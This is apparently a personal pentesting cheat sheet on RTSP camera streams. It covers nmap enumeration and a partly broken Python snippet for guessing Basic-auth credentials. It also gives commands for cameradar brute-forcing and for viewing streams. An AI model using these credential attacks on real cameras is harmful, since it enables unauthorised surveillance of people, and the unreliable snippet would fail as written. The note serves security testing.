---
title: "RTSP CCTV Cam Testing"
tags:
- sheet
---

## What is RTSP ?
The Real Time Streaming Protocol is an application-level used in entertainment and communications systems to control streaming media servers. Similar to **HTTP**, clients can issue commands such as: play, record, pause, etc. It's commonly used by IP cameras.

**Default ports**: `554`, `8554`, `5554`
**Syntax**: `rtsp://user:password@ip:port/route`


## Enumeration
- `nmap` has some convenient scripts when it comes to attacking RTSP. So just run them: `nmap -sV --script "rtsp-*" -p <PORT> <IP>`
	- ![[write-ups/images/Pasted image 20220805163325.png]]
	- the output will give you possible valid methods and URLs that are supported
	- ![[write-ups/images/Pasted image 20220805163532.png]]
- can also manually confirm it with `curl -i -X OPTIONS rtsp://<IP>:<PORT>/<ROUTE>`
	- a valid RTSP response should look similar to this
		```bash
		RTSP/1.0 200 OK
		CSeq: 1
		Date: Tue, Dec 08 2020 09:56:12 GMT
		Public: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, GET_PARAMETER, SET_PARAMETER
		```
	

## Brute-Force
- Basic auth with python
	- to create a basic auth req, we can use the `DESCRIBE` method & base64 encode our username/password
		```bash
		DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA== # admin:1234
		```
	- some python-fu  to automatically try this
		```python
		import socket
		from base64 import b64encode
	
		HOST  = "192.168.1.1"
		PORT  = 554
		CREDS = "admin:1234"
	
		req = f"DESCRIBE rtsp://<ip>:<port> RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64encode(CREDS)}\r\n\r\n"
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		s.sendall(req)
	
		data = s.recv(1024)
		print(data)
		```

### Even Easier
if you don't want to do this manually / create your own scripts, the community got you
- [rtsp_authgrinder.py](https://github.com/Tek-Security-Group/rtsp_authgrinder) quick / simple tool to brute force credentials on RTSP services
- [cameradar](https://github.com/Ullaakut/cameradar): an all-in-one tool which allows you to: detect open RTSP hosts, detect device model, launch dictionary attacks on routes & credentials
	- `cameradar -r routes.txt -t 192.168.1.131 -v -p 554 -c creds.json`
	- `docker run -t ullaakut/cameradar -t <target> <other command-line options>`

## Seeing the RTSP Stream
```bash
ffplay -loglevel 32 -rtsp_transport tcp -i rtsp://:@192.168.1.131/ -probesize 32 -analyzeduration
mpv rtsp://192.168.1.131/live.sdp
cvlc rtsp://192.168.1.131/Streaming/Channels/1
```


## Refs
- [Haktricks Pentesting rtsp](https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp)
- [Real Time Streming Protocol RFC](https://www.rfc-editor.org/rfc/rfc2326.html)
- [RTSP Brute Forcing for fun and naked pictures?](https://web.archive.org/web/20161020202643/http://badguyfu.net/rtsp-brute-forcing-for-fun-and-naked-pictures/)
- [Can't access cam with custom route isssue](https://github.com/Ullaakut/cameradar/issues/142)

## See Also